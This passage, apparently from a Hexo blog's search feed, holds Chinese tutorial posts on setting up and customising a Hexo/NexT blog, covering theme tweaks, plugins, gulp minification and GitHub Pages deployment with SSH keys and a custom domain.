代码块字体设置 codes: external: true family: size: 13 把false改为true，并修改了size的数值，单位是像素。如有需要可自行改变字体。 另外提供一种方法，供会前端的小伙伴参考：Next主题控制字体大小的文件是在主题文件夹中的 source\css_variables 目录下的 base.styl 文件， 找到该文件：themes\next\source\css_variables\base.styl 文件. // Font size $font-size-base = 16px //修改以前是14，我改成了16 $font-size-small = $font-size-base - 2px $font-size-smaller = $font-size-base - 4px $font-size-large = $font-size-base + 2px $font-size-larger = $font-size-base + 4px // Headings font size $font-size-headings-step = 2px $font-size-headings-base = 24px //这个是标题大小，如果你觉得不满意，可以改的更大一点 修改完之后，保存文件。重新部署 hexo ，就可以看到博客字体已经变成你想要的大小了。 文章加密访问先安装插件：npm install hexo-blog-encrypt --save 在根目录中package.json中添加依赖：&quot;hexo-blog-encrypt&quot;: &quot;2.0.*&quot; 在站点配置文件中开启，没有则添加： # Security encrypt: enable: true 打开主题目录下layout/_partials/head.swig文件,在meta标签后面插入这样一段代码： &lt;script&gt; (function(){ if(&apos;{{ page.password }}&apos;){ if (prompt(&apos;请输入文章密码&apos;) !== &apos;{{ page.password }}&apos;){ alert(&apos;密码错误！&apos;); history.back(); } } })(); &lt;/script&gt; 然后文章头部信息中添加password： password: 你设置的密码 如果password后面为空，则表示不用密码。 添加jiathis分享主题配置文件，设置如下： # JiaThis 分享服务 jiathis: true 博文置顶修改 hero-generator-index 插件，把文件：node_modules/hexo-generator-index/lib/generator.js 内的代码替换为： &apos;use strict&apos;; var pagination = require(&apos;hexo-pagination&apos;); module.exports = function(locals){ var config = this.config; var posts = locals.posts; posts.data = posts.data.sort(function(a, b) { if(a.top &amp;&amp; b.top) { // 两篇文章top都有定义 if(a.top == b.top) return b.date - a.date; // 若top值一样则按照文章日期降序排 else return b.top - a.top; // 否则按照top值降序排 } else if(a.top &amp;&amp; !b.top) { // 以下是只有一篇文章top有定义，那么将有top的排在前面（这里用异或操作居然不行233） return -1; } else if(!a.top &amp;&amp; b.top) { return 1; } else return b.date - a.date; // 都没定义按照文章日期降序排 }); var paginationDir = config.pagination_dir || &apos;page&apos;; return pagination(&apos;&apos;, posts, { perPage: config.index_generator.per_page, layout: [&apos;index&apos;, &apos;archive&apos;], format: paginationDir + &apos;/%d/&apos;, data: { __index: true } }); }; 在文章中添加 top 值，数值越大文章越靠前，如： --- title: Hexo搭建教程(1) date: {{ date }} tags: - hexo categories: - hexo top: 100 --- https://www.easyicon.net/download/ico/1230452/96/添加置顶标志：到next\layout_macro下的post.swig，找到&lt;div class=&quot;post-meta&quot;&gt; ，在下面添加对应代码 {% if post.top == 100 %} 置顶 | {% endif %} 自定义鼠标样式打开themes/next/source/css/_custom/custom.styl,在里面写下如下代码： 使用这样的方式获得ico图标链接地址// 鼠标样式 * { cursor: url(&quot;http://blog.ejubei.net/img/mouse.ico&quot;),auto!important } :active { cursor: url(&quot;http://blog.ejubei.net/img/mouse.ico&quot;),auto!important } 其中 url 里面必须是 ico 图片，ico 图片可以上传到网上，然后获取外链，复制到 url 里就行了 为博客加上萌萌的宠物安装插件：npm install -save hexo-helper-live2d 然后在博客站点的_config.yml 文件或主题的 _config.yml 文件中添加配置： live2d: enable: true scriptFrom: local pluginRootPath: live2dw/ pluginJsPath: lib/ pluginModelPath: assets/ tagMode: false debug: false model: use: live2d-widget-model-wanko display: position: right width: 150 height: 300 mobile: show: true 然后hexo clean ，hexo g ，hexo d 就可以看到了。 可以自定义使用的宠物模型，地址：https://github.com/EYHN/hexo-helper-live2d/blob/master/README.zh-CN.md 搜索功能安装插件：npm install hexo-generator-search --save 在主题配置文件下，查找local_search: local_search: enable: false trigger: auto top_n_per_article: 1 enable的值修改为true 在根目录配置文件中，添加以下代码： # 本地搜索功能 search: path: search.xml field: post format: html limit: 10000 点击爆炸效果首先在themes/next/source/js/src里面建一个叫fireworks.js的文件，代码如下： &quot;use strict&quot;; function updateCoords(e) { pointerX = (e.clientX || e.touches[0].clientX) - canvasEl.getBoundingClientRect().left, pointerY = e.clientY || e.touches[0].clientY - canvasEl.getBoundingClientRect().top } function setParticuleDirection(e) { var t = anime.random(0, 360) * Math.PI / 180, a = anime.random(50, 180), n = [ - 1, 1][anime.random(0, 1)] * a; return { x: e.x + n * Math.cos(t), y: e.y + n * Math.sin(t) } } function createParticule(e, t) { var a = {}; return a.x = e, a.y = t, a.color = colors[anime.random(0, colors.length - 1)], a.radius = anime.random(16, 32), a.endPos = setParticuleDirection(a), a.draw = function() { ctx.beginPath(), ctx.arc(a.x, a.y, a.radius, 0, 2 * Math.PI, !0), ctx.fillStyle = a.color, ctx.fill() }, a } function createCircle(e, t) { var a = {}; return a.x = e, a.y = t, a.color = &quot;#F00&quot;, a.radius = 0.1, a.alpha = 0.5, a.lineWidth = 6, a.draw = function() { ctx.globalAlpha = a.alpha, ctx.beginPath(), ctx.arc(a.x, a.y, a.radius, 0, 2 * Math.PI, !0), ctx.lineWidth = a.lineWidth, ctx.strokeStyle = a.color, ctx.stroke(), ctx.globalAlpha = 1 }, a } function renderParticule(e) { for (var t = 0; t &lt; e.animatables.length; t++) { e.animatables[t].target.draw() } } function animateParticules(e, t) { for (var a = createCircle(e, t), n = [], i = 0; i &lt; numberOfParticules; i++) { n.push(createParticule(e, t)) } anime.timeline().add({ targets: n, x: function(e) { return e.endPos.x }, y: function(e) { return e.endPos.y }, radius: 0.1, duration: anime.random(1200, 1800), easing: &quot;easeOutExpo&quot;, update: renderParticule }).add({ targets: a, radius: anime.random(80, 160), lineWidth: 0, alpha: { value: 0, easing: &quot;linear&quot;, duration: anime.random(600, 800) }, duration: anime.random(1200, 1800), easing: &quot;easeOutExpo&quot;, update: renderParticule, offset: 0 }) } function debounce(e, t) { var a; return function() { var n = this, i = arguments; clearTimeout(a), a = setTimeout(function() { e.apply(n, i) }, t) } } var canvasEl = document.querySelector(&quot;.fireworks&quot;); if (canvasEl) { var ctx = canvasEl.getContext(&quot;2d&quot;), numberOfParticules = 30, pointerX = 0, pointerY = 0, tap = &quot;mousedown&quot;, colors = [&quot;#FF1461&quot;, &quot;#18FF92&quot;, &quot;#5A87FF&quot;, &quot;#FBF38C&quot;], setCanvasSize = debounce(function() { canvasEl.width = 2 * window.innerWidth, canvasEl.height = 2 * window.innerHeight, canvasEl.style.width = window.innerWidth + &quot;px&quot;, canvasEl.style.height = window.innerHeight + &quot;px&quot;, canvasEl.getContext(&quot;2d&quot;).scale(2, 2) }, 500), render = anime({ duration: 1 / 0, update: function() { ctx.clearRect(0, 0, canvasEl.width, canvasEl.height) } }); document.addEventListener(tap, function(e) { &quot;sidebar&quot; !== e.target.id &amp;&amp; &quot;toggle-sidebar&quot; !== e.target.id &amp;&amp; &quot;A&quot; !== e.target.nodeName &amp;&amp; &quot;IMG&quot; !== e.target.nodeName &amp;&amp; (render.play(), updateCoords(e), animateParticules(pointerX, pointerY)) }, !1), setCanvasSize(), window.addEventListener(&quot;resize&quot;, setCanvasSize, !1) } &quot;use strict&quot;; function updateCoords(e) { pointerX = (e.clientX || e.touches[0].clientX) - canvasEl.getBoundingClientRect().left, pointerY = e.clientY || e.touches[0].clientY - canvasEl.getBoundingClientRect().top } function setParticuleDirection(e) { var t = anime.random(0, 360) * Math.PI / 180, a = anime.random(50, 180), n = [ - 1, 1][anime.random(0, 1)] * a; return { x: e.x + n * Math.cos(t), y: e.y + n * Math.sin(t) } } function createParticule(e, t) { var a = {}; return a.x = e, a.y = t, a.color = colors[anime.random(0, colors.length - 1)], a.radius = anime.random(16, 32), a.endPos = setParticuleDirection(a), a.draw = function() { ctx.beginPath(), ctx.arc(a.x, a.y, a.radius, 0, 2 * Math.PI, !0), ctx.fillStyle = a.color, ctx.fill() }, a } function createCircle(e, t) { var a = {}; return a.x = e, a.y = t, a.color = &quot;#F00&quot;, a.radius = 0.1, a.alpha = 0.5, a.lineWidth = 6, a.draw = function() { ctx.globalAlpha = a.alpha, ctx.beginPath(), ctx.arc(a.x, a.y, a.radius, 0, 2 * Math.PI, !0), ctx.lineWidth = a.lineWidth, ctx.strokeStyle = a.color, ctx.stroke(), ctx.globalAlpha = 1 }, a } function renderParticule(e) { for (var t = 0; t &lt; e.animatables.length; t++) { e.animatables[t].target.draw() } } function animateParticules(e, t) { for (var a = createCircle(e, t), n = [], i = 0; i &lt; numberOfParticules; i++) { n.push(createParticule(e, t)) } anime.timeline().add({ targets: n, x: function(e) { return e.endPos.x }, y: function(e) { return e.endPos.y }, radius: 0.1, duration: anime.random(1200, 1800), easing: &quot;easeOutExpo&quot;, update: renderParticule }).add({ targets: a, radius: anime.random(80, 160), lineWidth: 0, alpha: { value: 0, easing: &quot;linear&quot;, duration: anime.random(600, 800) }, duration: anime.random(1200, 1800), easing: &quot;easeOutExpo&quot;, update: renderParticule, offset: 0 }) } function debounce(e, t) { var a; return function() { var n = this, i = arguments; clearTimeout(a), a = setTimeout(function() { e.apply(n, i) }, t) } } var canvasEl = document.querySelector(&quot;.fireworks&quot;); if (canvasEl) { var ctx = canvasEl.getContext(&quot;2d&quot;), numberOfParticules = 30, pointerX = 0, pointerY = 0, tap = &quot;mousedown&quot;, colors = [&quot;#FF1461&quot;, &quot;#18FF92&quot;, &quot;#5A87FF&quot;, &quot;#FBF38C&quot;], setCanvasSize = debounce(function() { canvasEl.width = 2 * window.innerWidth, canvasEl.height = 2 * window.innerHeight, canvasEl.style.width = window.innerWidth + &quot;px&quot;, canvasEl.style.height = window.innerHeight + &quot;px&quot;, canvasEl.getContext(&quot;2d&quot;).scale(2, 2) }, 500), render = anime({ duration: 1 / 0, update: function() { ctx.clearRect(0, 0, canvasEl.width, canvasEl.height) } }); document.addEventListener(tap, function(e) { &quot;sidebar&quot; !== e.target.id &amp;&amp; &quot;toggle-sidebar&quot; !== e.target.id &amp;&amp; &quot;A&quot; !== e.target.nodeName &amp;&amp; &quot;IMG&quot; !== e.target.nodeName &amp;&amp; (render.play(), updateCoords(e), animateParticules(pointerX, pointerY)) }, !1), setCanvasSize(), window.addEventListener(&quot;resize&quot;, setCanvasSize, !1) }; 打开themes/next/layout/_layout.swig,在&lt;/body&gt;上面写下如下代码： &lt;!-- 爆炸效果 --&gt; {% if theme.fireworks %} {% endif %} 打开主题配置文件，在里面最后写下： # Fireworks fireworks: true 自定义文章的默认头部信息在根目录的/scaffolds/post.md文件中添加： --- title: {{ title }} date: {{ date }} tags: #标签 categories: #分类 copyright: true #版权声明 permalink: 01 #文章链接，有默认值 top: 0 #置顶优先级 password: #密码保护 --- 文章标签显示设置在主题配置文件中，查找post_meta： # 文章标签显示设置 post_meta: item_text: true created_at: true # 发表时间 updated_at: false # 更新时间 categories: true # 分类 # 文章字数显示设置（需要wordcount，前面已经下载） post_wordcount: item_text: true wordcount: true # 显示字数 min2read: false # 所需时间 totalcount: false # 总字数 separated_meta: true # 分割符 在底部增加运行时间打开文件：\themes\next\layout\_partials\footer.swig，在最后添加如下代码： &lt;!-- 在网页底部添加网站运行时间 --&gt; &lt;span id=&quot;timeDate&quot;&gt;载入天数...&lt;/span&gt;&lt;span id=&quot;times&quot;&gt;载入时分秒...&lt;/span&gt; &lt;script&gt; var now = new Date(); function createtime() { var grt= new Date(&quot;03/01/2019 00:00:00&quot;);//此处修改你的建站时间或者网站上线时间,2019-03-01 now.setTime(now.getTime()+250); days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days); hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours); if(String(hnum).length ==1 ){hnum = &quot;0&quot; + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum); mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = &quot;0&quot; + mnum;} seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum); snum = Math.round(seconds); if(String(snum).length ==1 ){snum = &quot;0&quot; + snum;} document.getElementById(&quot;timeDate&quot;).innerHTML = &quot;博客已运行&quot;+dnum+&quot; 天 &quot;; document.getElementById(&quot;times&quot;).innerHTML = hnum + &quot; 小时 &quot; + mnum + &quot; 分钟 &quot; + snum + &quot; 秒&quot;; } setInterval(&quot;createtime()&quot;,250); &lt;/script&gt; 利用 Gulp 来压缩你的 Hexo 博客的静态文件首先安装gulp：npm install gulp 继续安装依赖包： npm install --save-dev babel-cli npm install --save-dev babel-preset-es2015 npm install gulp-minify-css gulp-babel gulp-uglify gulp-htmlmin gulp-htmlclean --save-dev 在博客的根目录创建文件 gulpfile.js，代码如下： var gulp = require(&apos;gulp&apos;); var minifycss = require(&apos;gulp-minify-css&apos;); var babel = require(&apos;gulp-babel&apos;); var uglify = require(&apos;gulp-uglify&apos;); var htmlmin = require(&apos;gulp-htmlmin&apos;); var htmlclean = require(&apos;gulp-htmlclean&apos;); gulp.task(&apos;minify-css&apos;, function() { return gulp.src(&apos;./public/**/*.css&apos;).pipe(minifycss()).pipe(gulp.dest(&apos;./public&apos;)); }); gulp.task(&apos;minify-html&apos;, function() { return gulp.src(&apos;./public/**/*.html&apos;).pipe(htmlclean()).pipe(htmlmin({ removeComments: true, minifyJS: true, minifyCSS: true, minifyURLs: true, })).pipe(gulp.dest(&apos;./public&apos;)) }); gulp.task(&apos;minify-js&apos;, function() { return gulp.src([&apos;./public/**/*.js&apos;, &apos;!./public/**/*.min.js&apos;]).pipe(babel({ presets: [&apos;es2015&apos;] })).pipe(uglify()).pipe(gulp.dest(&apos;./public&apos;)); }); gulp.task(&apos;default&apos;, [&apos;minify-html&apos;, &apos;minify-css&apos;, &apos;minify-js&apos;]); 压缩方法：执行完hexo g 产生编译文件后，执行gulp，看到以下信息代表压缩成功，接下来使用hexo d 发布到服务器即可，可发现访问速度有了改善。 执行gulp时报错： $ gulp internal/modules/cjs/loader.js:583 throw err; ^ Error: Cannot find module &apos;@babel/core&apos; at Function.Module._resolveFilename (internal/modules/cjs/loader.js:581:15) at Function.Module._load (internal/modules/cjs/loader.js:507:25) at Module.require (internal/modules/cjs/loader.js:637:17) at require (internal/modules/cjs/helpers.js:22:18) at Object.&lt;anonymous&gt; (D:\yongnights.github.io\node_modules\gulp-babel\index.js:7:15) at Module._compile (internal/modules/cjs/loader.js:689:30) at Object.Module._extensions..js (internal/modules/cjs/loader.js:700:10) at Module.load (internal/modules/cjs/loader.js:599:32) at tryModuleLoad (internal/modules/cjs/loader.js:538:12) at Function.Module._load (internal/modules/cjs/loader.js:530:3) 该错误暂无法解决，故该方法先不执行。 添加网站和文章分享按钮安装插件：git clone https://github.com/theme-next/theme-next-needmoreshare2 themes/next/source/lib/needsharebutton themes/next/_config.yml，搜索needmoreshare2，修改如下： needmoreshare2: enable: true postbottom: enable: true #是否开启博客分享按钮 options: iconStyle: box boxForm: horizontal position: bottomCenter networks: Weibo,Wechat,Douban,QQZone float: enable: true #网站分享按钮 options: iconStyle: box boxForm: horizontal position: middleRight networks: Weibo,Wechat,Douban,QQZone 压缩页面静态资源安装插件：npm install hexo-neat --save 打开博客站点配置文件，在最后添加如下信息： # hexo-neat # 博文压缩 neat_enable: true # 压缩html neat_html: enable: true exclude: # 压缩css neat_css: enable: true exclude: - &apos;**/*.min.css&apos; # 压缩js neat_js: enable: true mangle: true output: compress: exclude: - &apos;**/*.min.js&apos; - &apos;**/jquery.fancybox.pack.js&apos; - &apos;**/index.js&apos; - &apos;**/clicklove.js&apos; - &apos;**/fireworks.js&apos; 删除博文目录自动生成的序数themes/next/_config.yml，搜索toc，修改如下： toc: enable: true # Automatically add list number to toc. number: false # If true, all words will placed on next lines if header width longer then sidebar width. wrap: false 不蒜子统计全局配置： 编辑 主题配置文件 中的busuanzi_count的配置项。当enable: true时，代表开启全局开关。若site_uv、site_pv、page_pv的值均为false时，不蒜子仅作记录而不会在页面上显示。 站点UV配置： 当site_uv: true时，代表在页面底部显示站点的UV值。 site_uv_header和site_uv_footer为自定义样式配置，相关的值留空时将不显示，可以使用（带特效的）font-awesome。显示效果为[site_uv_header]UV值[site_uv_footer]。 # 效果：本站访客数12345人次 site_uv: true site_uv_header: 本站访客数 site_uv_footer: 人次 站点PV配置： 当site_pv: true时，代表在页面底部显示站点的PV值。 site_pv_header和site_pv_footer为自定义样式配置，相关的值留空时将不显示，可以使用（带特效的）font-awesome。显示效果为[site_pv_header]PV值[site_pv_footer]。 # 效果：本站总访问量12345次 site_pv: true site_pv_header: 本站总访问量 site_pv_footer: 次 单页面PV配置： 当page_pv: true时，代表在文章页面的标题下显示该页面的PV值（阅读数）。 page_pv_header和page_pv_footer为自定义样式配置，相关的值留空时将不显示，可以使用（带特效的）font-awesome。显示效果为[page_pv_header]PV值[page_pv_footer]。 # 效果：本文总阅读量12345次 page_pv: true page_pv_header: 本文总阅读量 page_pv_footer: 次 添加友情链接编辑 主题配置文件 添加： # Blog rolls links_icon: link links_title: 友情链接 # links_layout: block links_layout: inline links: 博客园: http://www.cnblogs.com/sanduzxcvbnm/ 百度: https://www.baidu.com/ 腾讯公益404页面新建 404.html 页面，放到主题的 source 目录下，内容如下： &lt;!DOCTYPE HTML&gt; &lt;html&gt; &lt;head&gt; &lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8;&quot;/&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge,chrome=1&quot; /&gt; &lt;meta name=&quot;robots&quot; content=&quot;all&quot; /&gt; &lt;meta name=&quot;robots&quot; content=&quot;index,follow&quot;/&gt; &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://qzone.qq.com/gy/404/style/404style.css&quot;&gt; &lt;/head&gt; &lt;body&gt; &lt;script type=&quot;text/plain&quot; src=&quot;http://www.qq.com/404/search_children.js&quot; charset=&quot;utf-8&quot; homePageUrl=&quot;/&quot; homePageName=&quot;回到我的主页&quot;&gt; &lt;/script&gt; &lt;script src=&quot;https://qzone.qq.com/gy/404/data.js&quot; charset=&quot;utf-8&quot;&gt;&lt;/script&gt; &lt;script src=&quot;https://qzone.qq.com/gy/404/page.js&quot; charset=&quot;utf-8&quot;&gt;&lt;/script&gt; &lt;/body&gt; &lt;/html&gt; 设置动画效果NexT 默认开启动画效果，效果使用 JavaScript 编写，因此需要等待 JavaScript 脚本完全加载完毕后才会显示内容。 如果您比较在乎速度，可以将设置此字段的值为 false 来关闭动画。 编辑 主题配置文件， 搜索 use_motion，根据您的需求设置值为 true 或者 false 即可： use_motion: true # 开启动画效果 use_motion: false # 关闭动画效果 添加近期文章版块在next/layout/_macro/sidebar.swig中的if theme.links对应的endif后面添加如下代码： 在主题的_config.yml中添加了几个变量，如下：recent_posts_title: 近期文章recent_posts_layout: blockrecent_posts: true添加网易云音乐外链修改 themes/next/layout/_macro/sidebar.swig 文件，在联系方式下添加网易云音乐外链： &lt;iframe frameborder=&quot;no&quot; border=&quot;0&quot; marginwidth=&quot;0&quot; marginheight=&quot;0&quot; width=330 height=86 src=&quot;//music.163.com/outchain/player?type=2&amp;id=1333220817&amp;auto=1&amp;height=66&quot;&gt;&lt;/iframe&gt; 然后hexo g/hexo d即可。 获取网易云外链的方式：打开网易云音乐网站，搜索歌曲，进入到歌曲详情页面，左侧有生成外链的按钮，可以选择是否自动播放等，但是受版权保护的音乐无法生成外链。 ​]]></content>
      <categories>
        <category>hexo</category>
      </categories>
      <tags>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hexo搭建教程(2)]]></title>
    <url>%2F2019%2F12%2F31%2FHexo%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B-2%2F</url>
    <content type="text"><![CDATA[第一部分hexo搭建步骤安装Git安装Node.js安装HexoGitHub创建个人仓库生成SSH添加到GitHub将hexo部署到GitHub设置个人域名发布文章安装GitGit是目前世界上最先进的分布式版本控制系统，可以有效、高速的处理从很小到非常大的项目版本管理。 也是用来管理你的hexo博客文章，上传到GitHub的工具。 windows：到git官网上下载,下载安装后会有一个Git Bash的命令行工具，以后就用这个工具来使用git。 linux：因为最早的git就是在linux上编写的，只需要一行代码：yum install git (apt-get install git) 安装好后，用git --version 来查看一下版本 注意:一定要安装最新的版本，若版本太低后面使用git时会有如下错误情况： 错误提示： fatal: unable to access &apos;https://github.com/iissnan/hexo-theme-next.git&apos;: error :1407742E:SSL routines:SSL23_GET_SERVER_HELLO:tlsv1 alert protocol version 错误分析：github 2月1日发了个公告Weak cryptographic standards removal notice，简而言之就是不支持TLSv1/TLSv1.1 解决办法： 第一种：更新git和tortoisegit至最新版 第二种：检查TLS版本：git config http.sslVersion 如果是tlsv1.0，则用下面一句命令行更新至tlsv1.2 git config --global http.sslVersion tlsv1.2 安装nodejsHexo是基于nodejs编写的，需要安装一下nodejs和里面的npm工具。 windows：nodejs选择LTS版本，下载，安装。 linux：yum install nodejs &amp;&amp; yum install npm 或者：sudo apt-get install nodejs sudo apt-get install npm 安装完后，打开命令行，检查一下有没有安装成功 node -v npm -v 安装hexo前面git和nodejs安装好后，就可以安装hexo了。先创建一个文件夹my-blog，然后cd到这个文件夹下（或者在这个文件夹下直接右键git bash打开）。 安装Hexo脚手架工具，输入命令：npm install -g hexo-cli 用hexo -v查看一下版本 至此所需要的软件就全部安装完了。 接下来初始化一下hexo： $ hexo init my-blog # 创建并初始化博客目录 $ cd my-blog # 进入该博客目录 $ npm install # 创建默认博客文件 新建完成后，指定文件夹目录下有： myblog ├── node_modules #依赖包 ├── public #存放生成的页面 ├── scaffolds #生成文章的一些模板 ├── source #用来存放你的文章 | ├── _drafts #草稿目录 | └── _posts #发布的文章目录 └── themes #主题 ├── _config.yml #博客配置文件 ├── package.json #模块和依赖项 _config.yml博客配置文件说明： 网站主题的的配置文件，和github page关联和切换主题时，需要使用到 # Hexo Configuration ## Docs: https://hexo.io/docs/configuration.html ## Source: https://github.com/hexojs/hexo/ # Site title: 网站标题如：Minstorm-blog subtitle: 网站副标题：Minstorm description: 网站描述：Minstorm:a blog for tech author: 网站作者：De scherpe language: 网站的语言，跟当前使用的主题下的语言文件有关 timezone: 网站的时区，默认使用的是电脑的时区 # URL ## If your site is put in a subdirectory, set url as &apos;http://yoursite.com/child&apos; and root as &apos;/child/&apos; url: 网站地址，也就是https://xxx.github.io/ 地址 root: 网站根目录,建议是用&apos;/&apos; permalink: 文章的永久链接格式，默认就好 :year/:month/:day/:title/ permalink_defaults: 永久链接中各部分的默认值，不用填 # Directory source_dir:资源文件夹，存放文章用的：source public_dir: 公共文件夹，用来存放编译之后的文件：public tag_dir: 标签文件夹：tags archive_dir: 归档文件夹，也就是你的全部文章生成的目录：archives category_dir: 分类文件夹：categories code_dir: Include code文件夹：downloads/code i18n_dir: 国际化（i18n）文件夹:lang skip_render: 需要跳过渲染的文件存放的文件夹 # Writing new_post_name: :title.md # File name of new posts default_layout: 默认文章样式：post titlecase: false # Transform title into titlecase external_link: true # Open external links in new tab filename_case: 0 render_drafts: false post_asset_folder: false relative_link: false future: true highlight: enable: true line_number: true auto_detect: false tab_replace: # Home page setting # path: Root path for your blogs index page. (default = &apos;&apos;) # per_page: Posts displayed per page. (0 = disable pagination) # order_by: Posts order. (Order by date descending by default) index_generator: path: &apos;&apos; per_page: 每一页显示的文章：10 order_by: -date # Category &amp; Tag default_category: uncategorized category_map: tag_map: # Date / Time format ## Hexo uses Moment.js to parse and display date ## You can customize the date format as defined in ## http://momentjs.com/docs/#/displaying/format/ date_format: YYYY-MM-DD time_format: HH:mm:ss # Pagination ## Set per_page to 0 to disable pagination per_page: 10 pagination_dir: page # Extensions ## Plugins: https://hexo.io/plugins/ ## Themes: https://hexo.io/themes/ theme: 主题：next # Deployment ## Docs: https://hexo.io/docs/deployment.html deploy: # 同步使用 type: 接下来开启服务 编译生成静态网页文件，执行如下命令： $ hexo generate 可以简写为$ hexo g 注意，如下图才是命令正确执行，否则按照提示解决错误 本地预览文章，执行如下命令： $ hexo server 可以简写为$ hexo s 如果需要预览draft文件夹下面的文件，需要在后面加上--draft参数 $ hexo s --draft 在执行hexo s命令后，会出现一个网址http://localhost:4000/，将其复制(需要注意的是，在cmd中不可用ctrl + c 来复制，Ctrl + C为停止命令）。 打开该网址后，可以看到网站的雏形，使用ctrl+c可以把服务关掉。 注：以上的操作实现的效果如下: - 运行服务后，可以在本地预览博客。 - 接下来的操作是把博客文件给推送到GitHub上，使用GitHub提供的域名访问博客 GitHub创建个人仓库首先注册一个GitHub账户(注意：用户名跟你的博客域名有关，请慎重取名) 注册完登录后，在GitHub.com中看到一个New repository，新建仓库。 需要创建一个和你用户名相同的仓库，后面加.github.io， 只有这样，将来要部署到GitHub page的时候，才会被识别，也就是xxx.github.io， 其中xxx就是你注册GitHub的用户名。 生成SSH添加到GitHub回到你的git bash中，输入如下两条命令： git config --global user.name &quot;yourname&quot; git config --global user.email &quot;youremail&quot; 这里的yourname输入你的GitHub用户名，youremail输入你GitHub的邮箱。这样GitHub才能知道你是不是对应它的账户。 可以用以下两条，检查一下你有没有输对： git config user.name git config user.email 然后创建SSH,一路回车 ssh-keygen -t rsa -C &quot;youremail&quot; youremail是你注册GitHub的邮箱 这个时候它会告诉你已经生成了.ssh的文件夹。在你的电脑中找到这个文件夹。 简单来讲，就是一个秘钥，其中，id_rsa是你这台电脑的私人秘钥，不能给别人看的，id_rsa.pub是公共秘钥，可以随便给别人看。 把这个公钥放在GitHub上，这样当你链接GitHub自己的账户时，它就会根据公钥匹配你的私钥，当能够相互匹配时，才能够顺利的通过git上传你的文件到GitHub上。 而后在GitHub的setting中，找到SSH keys的设置选项，点击New SSH key，把你的id_rsa.pub里面的信息复制进去。 在gitbash中，查看是否成功 ssh -T git@github.com 将hexo部署到GitHub这一步，我们就可以将hexo和GitHub关联起来，也就是将hexo生成的文章部署到GitHub上。 需要用到hexo的GitHub插件hexo-deployer-git，首先用npm下载这个插件 $ npm install hexo-deployer-git --save 然后打开站点配置文件_config.yml，翻到最后，修改为YourgithubName就是你的GitHub账户 deploy: type: git repo: git@github.com:用户名/用户名.github.io.git branch: master 配置好了deploy之后，就可以运行以下命令上传项目了 hexo clean hexo generate hexo deploy 其中 hexo clean清除了你之前生成的东西，也可以不加。 hexo generate 顾名思义，生成静态文章，可以用 hexo g缩写 hexo deploy 部署文章，可以用hexo d缩写 注意deploy时可能要你输入username和password。 得到下图就说明部署成功了，过一会儿就可以在https://yourname.github.io 这个网站看到你的博客了！ 设置个人域名现在你的个人网站的地址是 yourname.github.io，如果觉得这个网址逼格不太够，这就需要你设置个人域名了。但是需要花钱。 注册一个阿里云账户,在阿里云上买一个域名，先去进行实名认证,然后在域名控制台中，看到你购买的域名。 点解析进去，添加解析 记录类型选A或CNAME，A记录的记录值就是ip地址，github(官方文档)提供了两个IP地址，192.30.252.153和192.30.252.154， 这两个IP地址为github的服务器地址，两个都要填上，解析记录设置两个@，线路就默认就行了，CNAME记录值填你的github博客网址。 如下图所示： 注意，解析线路选择默认，(解析线路:境外是后面来做国内外分流用的,在后面会讲到)。记得现在选择默认！ 登录GitHub，进入之前创建的仓库，点击settings，设置Custom domain，输入你的网站地址 顺便再勾选上强制使用https，&quot;Enforce HTTPS&quot; 然后在你的博客文件根目录的source中创建一个名为CNAME文件，不要后缀。写上你的网站地址。 最后，在gitbash中，输入 hexo clean hexo g hexo d 稍等一会儿，再打开你的浏览器，输入你自己的网站地址(使用https的方式)，就可以看到搭建的网站啦！ 总结，GitHub上面的配置和CNAME里面的设置互相结合，有如下几种方式： 接下来你就可以正式开始写文章了。 使用命令行工具创建一篇文章 $ hexo new [layout] &lt;title&gt; layout是文章的布局，默认是post布局 &lt;title&gt; 是文章名称 例如：hexo new post &apos;我的第一篇文章&apos; hexo还有一个文件夹是草稿文件夹_draft，可以用理解成私密文章的功能， 只要有不想显示的文章但是又不想删除，就可以把文章拖进去_draft文件夹就可以实现隐藏的功能了，也可以用hexo的命令将文章放到草稿文件夹 $ hexo publish &lt;layout&gt; &lt;filename&gt; 然后在source/_post中打开markdown文件，就可以开始编辑了。当你写完的时候，再 hexo clean hexo g hexo d 就可以看到更新了。]]></content>
      <categories>
        <category>hexo</category>
      </categories>
      <tags>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hexo搭建教程(3)]]></title>
    <url>%2F2019%2F12%2F31%2FHexo%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B-3%2F</url>
    <content type="text"><![CDATA[第二部分hexo基本配置在文件根目录下的_config.yml，就是整个hexo框架的配置文件了。可以在里面修改大部分的配置。详细可参考官方的配置描述。 网站description主要用于SEO，告诉搜索引擎一个关于您站点的简单描述，通常建议在其中包含您网站的关键词。 author参数用于主题显示文章的作者。 language可以用来解决菜单中文乱码，设置language字段如下: language: zh-Hans 或者 anguage: zh-CN 取决于你的主题theme目录下的language目录下有zh-Hans.yml还是zh-CN.yml timezone，东八区设置是 Asia/Shanghai 网址在这里需要把url改成你的网站域名，也就是第一步仓库地址的那个，https://xxx.github.io/ permalink，也就是你生成某个文章时的那个链接格式。 比如我新建一个文章叫temp.md，那么这个时候他自动生成的地址就是https://xxx.github.io/年/月/日/temp。 以下是官方给出的示例，关于链接的变量还有很多，需要的可以去官网上查找 永久链接 。 网站存放在子目录 如果您的网站存放在子目录中，例如 https://xxx.github.io/blog，则请将您的 url 设为 https://xxx.github.io/blog 并把 root 设为 /blog/。 再往下翻，中间这些都默认就好了。 theme: landscape theme就是选择什么主题，也就是在theme这个文件夹下，在官网上有很多个主题，默认给你安装的是lanscape这个主题。 当你需要更换主题时，在官网上下载，把主题的文件放在theme文件夹下，再修改这个参数就可以了。 同步到Git # Deployment ## Docs: https://hexo.io/docs/deployment.html deploy: type: git repo: &lt;repository url&gt; branch: [branch] 